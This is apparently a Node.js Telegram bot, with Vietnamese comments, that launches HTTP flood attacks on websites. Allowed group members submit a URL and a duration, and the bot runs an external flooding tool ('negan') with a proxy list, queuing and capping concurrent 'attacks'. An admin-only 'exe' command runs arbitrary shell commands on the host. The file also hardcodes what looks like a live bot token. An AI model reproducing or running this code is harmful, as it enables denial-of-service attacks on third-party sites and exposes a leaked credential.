const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];

// Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

// Hàm gửi thông báo dưới dạng HTML kèm nút
const sendMessage = async (chatId, message, buttons = []) => {
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: buttons } });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000), startTime = getVietnamTime();
    const startMessage = `<pre>🚀 Success 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCommand caller: @${username}\nStart time: ${startTime}\nMaximum concurrent attacks: ${maxSlot} slots</pre>`;
    const buttons = [[{ text: 'Host Check', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]];
    await sendMessage(chatId, startMessage, buttons);

    const child = exec(command, { shell: '/bin/bash' });
    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = `<pre>✅ Process completed\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCommand caller: @${username}\nEnd time: ${endTime}</pre>`;
        sendMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        if (attackQueue.length > 0) executeCommand(...attackQueue.shift());
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendMessage(chatId, '<b>🚫 Bạn không có quyền thực hiện lệnh này.</b>');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return sendMessage(chatId, '<b>🚫 Sai định dạng! Nhập theo: &lt;URL&gt; &lt;time&gt;.</b>');
        if (time > maxTimeAttacks) return sendMessage(chatId, `<b>🚫 Thời gian tối đa là ${maxTimeAttacks} giây.</b>`);

        // Kiểm tra số lệnh đang chạy của người dùng
        const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
        if (userAttacks >= maxSlot) {
            const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
            return sendMessage(chatId, `<b>🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.</b>`);
        }

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendMessage(chatId, '<b>⏳ Lệnh của bạn đã được thêm vào hàng đợi. Vui lòng chờ...</b>');
        }

        currentAttacks.set(chatId, { user: chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, startTime: Date.now() });
        executeCommand(chatId, `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendMessage(chatId, '<b>🚫 Lệnh không được để trống. Ví dụ: exe ls</b>');
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            const resultMessage = `<pre>🚀 Command result:\n${command}\n${stdout || stderr}</pre>`;
            sendMessage(chatId, resultMessage);
        });
        return;
    }

    // Lệnh không hợp lệ
    sendMessage(chatId, '<b>🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.</b>');
});
